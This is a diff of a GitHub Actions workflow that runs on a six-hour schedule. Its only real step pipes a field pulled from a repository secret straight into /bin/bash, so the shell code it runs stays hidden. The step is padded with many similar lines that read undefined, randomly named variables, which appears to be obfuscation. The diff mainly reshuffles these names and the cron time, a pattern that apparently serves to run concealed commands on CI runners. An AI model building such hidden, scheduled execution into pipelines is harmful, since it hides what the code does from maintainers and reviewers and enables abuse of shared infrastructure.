@@ -1,28 +1,32 @@
 name: penchunfenyou
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 1/6 * * *'
-jobs:  # 22966
+    - cron: '59 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: penchunfenyou
         env:
-          ds5085: ${{ secrets.ds5085 }}
+          zr73: ${{ secrets.zr73 }}
         run: |
-          echo $ds5085 | jq -r .ii58069 | /bin/bash
-          echo $kud4 | jq -r .mpyv3 | /bin/bash
-          echo $rry28 | jq -r .j445 | /bin/bash
-          echo $pt094 | jq -r .dk004 | /bin/bash
-          echo $jx20926 | jq -r .sny198 | /bin/bash
-          echo $edov07 | jq -r .r70023 | /bin/bash
-          echo $k34570 | jq -r .ltvy628 | /bin/bash
-          echo $admzt82 | jq -r .qa735 | /bin/bash
-          echo $j025 | jq -r .kqiu523 | /bin/bash
-          echo $oj63 | jq -r .yirvp217 | /bin/bash
-          echo $bajl4 | jq -r .g64 | /bin/bash
-          echo $h46279 | jq -r .qw5545 | /bin/bash
+          echo $zr73 | jq -r .fze123 | /bin/bash
+          echo $iui0880 | jq -r .ocbn1 | /bin/bash
+          echo $prqgt2650 | jq -r .ywi4 | /bin/bash
+          echo $ylpge7500 | jq -r .mb311 | /bin/bash
+          echo $jcbq63941 | jq -r .ky8 | /bin/bash
+          echo $dswb6 | jq -r .c529 | /bin/bash
+          echo $cbg5 | jq -r .g715 | /bin/bash
+          echo $s6284 | jq -r .cb56 | /bin/bash
+          echo $xfz6 | jq -r .m844 | /bin/bash
+          echo $o57 | jq -r .wjdc334 | /bin/bash
+          echo $qkuqk74 | jq -r .ziko3 | /bin/bash
+          echo $qvjf2 | jq -r .fkods7 | /bin/bash
+          echo $bjor26 | jq -r .ole3 | /bin/bash
+          echo $m5472 | jq -r .eshw34716 | /bin/bash
+          echo $b5 | jq -r .jkvng427 | /bin/bash
+          echo $ynkjg90 | jq -r .waci30680 | /bin/bash
 
